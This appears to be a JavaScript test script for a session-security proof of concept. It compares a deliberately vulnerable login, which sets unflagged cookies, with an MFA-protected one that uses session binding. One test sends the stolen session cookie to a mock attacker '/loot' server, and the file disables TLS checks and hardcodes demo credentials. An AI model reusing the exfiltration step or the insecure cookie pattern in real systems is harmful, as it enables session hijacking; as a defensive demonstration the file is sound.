const { authenticator } = require('otplib');

// Allow self-signed certificate in test runner
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const BASE_URL = 'https://localhost:8443';
const HTTP_BASE_URL = 'http://localhost:3000';
const ATTACKER_URL = 'http://localhost:4000';
const DEMO_SECRET = 'JBSWY3DPEHPK3PXP';

async function runTests() {
  console.log('\n======================================================');
  console.log('🧪 RUNNING AUTOMATED VERIFICATION FOR VELOTECH POC');
  console.log('======================================================\n');

  let passed = 0;
  let failed = 0;

  function assert(condition, name) {
    if (condition) {
      console.log(`✅ [PASS] ${name}`);
      passed++;
    } else {
      console.error(`❌ [FAIL] ${name}`);
      failed++;
    }
  }

  // TEST 1: Vulnerable Route issues unflagged cookie
  console.log('[*] Test 1: Testing Vulnerable Login (/login-vulnerable)...');
  try {
    const res = await fetch(`${BASE_URL}/login-vulnerable`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
      body: JSON.stringify({ username: 'admin', password: 'Password123!' })
    });
    
    const setCookie = res.headers.get('set-cookie') || '';
    assert(res.status === 200, 'Vulnerable login returned HTTP 200 OK');
    assert(setCookie.includes('session='), 'Vulnerable login set session cookie');
    assert(!setCookie.toLowerCase().includes('httponly'), 'Vulnerable cookie DOES NOT have HttpOnly flag (Flow A requirement)');
    assert(!setCookie.toLowerCase().includes('samesite=strict'), 'Vulnerable cookie DOES NOT have SameSite=Strict');

    // Extract cookie value
    const vulnerableCookie = setCookie.split(';')[0];

    // TEST 2: Attacker Loot Exfiltration
    console.log('\n[*] Test 2: Testing Attacker C2 Loot Exfiltration (/loot)...');
    const lootRes = await fetch(`${ATTACKER_URL}/loot`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        cookie: vulnerableCookie,
        origin: BASE_URL,
        userAgent: 'Victim-Browser-Agent'
      })
    });
    const lootData = await lootRes.json();
    assert(lootRes.status === 200 && lootData.success, 'Attacker server captured exfiltrated cookie');

  } catch (e) {
    console.error('Test 1/2 error:', e);
    failed++;
  }

  // TEST 3: Secure Login 2-Step Flow
  console.log('\n[*] Test 3: Testing Secure Login Step 1 (/login-secure/step1)...');
  try {
    let cookieJar = '';
    // Step 1
    const step1Res = await fetch(`${BASE_URL}/login-secure/step1`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'User-Agent': 'TestSecureBrowser/1.0', 'Accept': 'application/json' },
      body: JSON.stringify({ username: 'admin', password: 'Password123!' })
    });
    const step1Data = await step1Res.json();
    cookieJar = step1Res.headers.get('set-cookie')?.split(';')[0] || '';

    assert(step1Res.status === 200 && step1Data.step === 'mfa_required', 'Secure Step 1 validated password & requested MFA');

    // Step 2 with valid TOTP code
    console.log('[*] Test 4: Testing Secure Login Step 2 (/login-secure/step2)...');
    const validTotp = authenticator.generate(DEMO_SECRET);
    const step2Res = await fetch(`${BASE_URL}/login-secure/step2`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Cookie': cookieJar,
        'User-Agent': 'TestSecureBrowser/1.0',
        'Accept': 'application/json'
      },
      body: JSON.stringify({ code: validTotp })
    });
    const step2Data = await step2Res.json();
    const secureSetCookie = step2Res.headers.get('set-cookie') || '';

    assert(step2Res.status === 200 && step2Data.success, 'Secure Step 2 accepted valid TOTP token');
    assert(secureSetCookie.toLowerCase().includes('httponly'), 'Secure cookie HAS HttpOnly flag (Flow B requirement)');
    assert(secureSetCookie.toLowerCase().includes('samesite=strict'), 'Secure cookie HAS SameSite=Strict flag');
    assert(secureSetCookie.toLowerCase().includes('secure'), 'Secure cookie HAS Secure flag');

    const secureSessionCookie = secureSetCookie.split(';')[0] || cookieJar;

    // TEST 5: Access Protected Dashboard with Secure Cookie
    console.log('\n[*] Test 5: Accessing Dashboard with Secure Session...');
    const dashRes = await fetch(`${BASE_URL}/api/session-info`, {
      headers: {
        'Cookie': secureSessionCookie,
        'User-Agent': 'TestSecureBrowser/1.0',
        'Accept': 'application/json'
      }
    });
    const dashData = await dashRes.json();
    assert(dashRes.status === 200 && dashData.authenticated === true, 'Protected dashboard accessible with valid session & matching UA');
    assert(dashData.securityContext.assuranceLevel.includes('AAL2'), 'Assurance Level confirmed as NIST AAL2');

    // TEST 6: Session Binding Middleware Hijack Defense
    console.log('\n[*] Test 6: Testing Session Binding Hijack Replay Defense...');
    const hijackRes = await fetch(`${BASE_URL}/api/session-info`, {
      headers: {
        'Cookie': secureSessionCookie,
        'User-Agent': 'AttackerHijackBot/9.9' // Mismatched User-Agent!
      }
    });
    assert(hijackRes.status === 401, 'Session Binding successfully rejected request with spoofed/mismatched User-Agent (HTTP 401)');

  } catch (e) {
    console.error('Test 3-6 error:', e);
    failed++;
  }

  console.log('\n======================================================');
  console.log(`🏁 VERIFICATION COMPLETE: ${passed} Passed, ${failed} Failed`);
  console.log('======================================================\n');

  if (failed > 0) process.exit(1);
}

runTests();
